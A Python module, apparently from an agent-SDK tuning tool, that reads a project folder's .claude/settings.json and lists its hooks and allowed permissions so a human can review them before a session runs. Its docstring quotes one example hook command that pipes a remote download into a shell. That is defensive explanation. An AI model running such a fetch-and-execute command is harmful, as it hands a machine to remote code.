"""What a project folder brings with it, in words the Arbiter can act on.

`tuning_session` passes `setting_sources=["project"]`, and that is not a style choice: it is how
the method reaches the model. The project's own `.claude/skills/autosound-tuning` is the ONLY
place the skill can come from, and a session without it does not fail — it improvises, which is
far worse.

The same switch hands the session that project's `.claude/settings.json`, whole: its hooks and
its `permissions.allow`. And a project is a FOLDER. It arrives from a backup, a memory stick, a
customer, a clone of somebody's repository. So it can carry a hook that runs a command on this
machine before a single question is asked, and a permission the Arbiter never gave (HUB-050).

**The SDK has no filter for this.** `setting_sources` takes whole sources — `user`, `project`,
`local` — and nothing narrows one to skills alone (checked against claude-agent-sdk 0.2.145:
`_apply_skills_defaults` in `_internal/transport/subprocess_cli.py` only DEFAULTS the sources when
they are unset; `skills=` adds `Skill(name)` to `allowed_tools` and nothing more). Setting it to
`[]` blindly is what the audit suggested and it would take the method away with the risk.

So this module does the other thing the ticket allows: it does not decide, it SAYS. What the
folder will apply, by name, before the session starts — because "a project settings file exists"
is not a fact anyone can act on, and "PreToolUse runs `curl http://x | sh`" is.

Nothing here blocks, edits, or sanitises. A reader that quietly dropped a hook would be a second
opinion about somebody's own configuration, and TCC does not hold one.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

#: Trimmed to keep one line readable in a dialog bubble. The full text is in the file, which is
#: named in the first line of the report — a truncated command is a prompt to go and look, and it
#: must never be mistaken for the whole of what runs.
_COMMAND_CHARS = 120


def settings_path(project_dir: Path) -> Path:
    return Path(project_dir) / ".claude" / "settings.json"


def inherited(project_dir: Path) -> list[str]:
    """Lines naming what this project's settings will apply. Empty when it applies nothing.

    Never raises: this runs on the way into a session, and a folder that cannot be read is a thing
    to say rather than a thing to fall over.
    """
    path = settings_path(project_dir)
    try:
        raw = path.read_text(encoding="utf-8")
    except OSError:
        return []
    try:
        data: Any = json.loads(raw)
    except ValueError as exc:
        # NOT the same as empty. Unreadable is the one case where nobody can say what will be
        # applied — including this function — and silence there would read as "nothing".
        return [f"{path}: settings.json could not be read ({exc}); what it applies is unknown"]
    if not isinstance(data, dict):
        return [f"{path}: settings.json is not an object; what it applies is unknown"]

    said: list[str] = []
    hooks = data.get("hooks")
    if isinstance(hooks, dict):
        for event, entries in hooks.items():
            for command in _commands_of(entries):
                said.append(f"hook {event}: {command}")
    allow = (data.get("permissions") or {}).get("allow")
    if isinstance(allow, list):
        # One line each. A count sends the Arbiter to the file; a name lets them answer.
        said.extend(f"allows {tool}" for tool in allow if isinstance(tool, str))
    if said:
        said.insert(0, f"this project's {path.name} applies:")
    return said


def _commands_of(entries: Any) -> list[str]:
    """Every command a hook event would run, whatever nesting the file uses.

    Settings files carry `[{"hooks": [{"type": "command", "command": ...}]}]` and older shapes put
    the command at the top level. Both are read: a shape this does not recognise must not silently
    become "no hooks here".
    """
    found: list[str] = []
    for entry in entries if isinstance(entries, list) else []:
        if not isinstance(entry, dict):
            continue
        inner = entry.get("hooks")
        candidates = inner if isinstance(inner, list) else [entry]
        for hook in candidates:
            if not isinstance(hook, dict):
                continue
            command = hook.get("command")
            if isinstance(command, str) and command.strip():
                text = command.strip()
                found.append(
                    text if len(text) <= _COMMAND_CHARS else text[:_COMMAND_CHARS] + " …"
                )
            elif hook:
                found.append(f"<a hook with no command: {sorted(hook)}>")
    return found
